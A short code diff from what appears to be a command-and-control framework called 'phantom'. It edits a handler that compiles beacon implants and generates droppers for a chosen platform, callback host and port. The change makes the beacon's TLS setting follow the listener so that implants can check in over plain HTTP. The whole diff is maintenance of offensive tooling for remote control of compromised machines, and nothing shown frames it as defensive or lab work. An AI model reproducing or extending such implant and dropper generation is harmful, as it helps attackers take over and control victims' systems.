@@ -1998,11 +1998,16 @@ async def c2_generate(request: web.Request) -> web.Response:
         # c2_crypto.beacon_config_endpoint: comparing the whole header always
         # differed and forced a full recompile on every single build).
         from phantom.utils.c2_crypto import beacon_config_endpoint
+        # TLS follows the LISTENER, never a literal: this endpoint returned
+        # an https:// callback while the C2 could be listening on plain HTTP,
+        # so the beacon had nowhere to check in and could not say why.
+        from phantom.utils.network import c2_use_ssl
+        use_ssl = c2_use_ssl()
         path = compile_beacon(platform, pkg_root,
                               force_rebuild=(beacon_config_endpoint(beacon_dir)
                                              != (lhost, lport)),
                               arch="x64",
-                              host=lhost, port=lport, use_ssl=True)
+                              host=lhost, port=lport, use_ssl=use_ssl)
         if not path:
             return _error(
                 f"Build failed: toolchain not ready for {platform}. "
@@ -2013,7 +2018,7 @@ async def c2_generate(request: web.Request) -> web.Response:
         try:
             from phantom.utils.builder import generate_dropper
             dropper = generate_dropper(platform, lhost, lport, arch="x64",
-                                       use_ssl=True, resilient=True)
+                                       use_ssl=use_ssl, resilient=True)
         except Exception:
             dropper = ""
         return _json({"status": "compiled", "platform": platform,
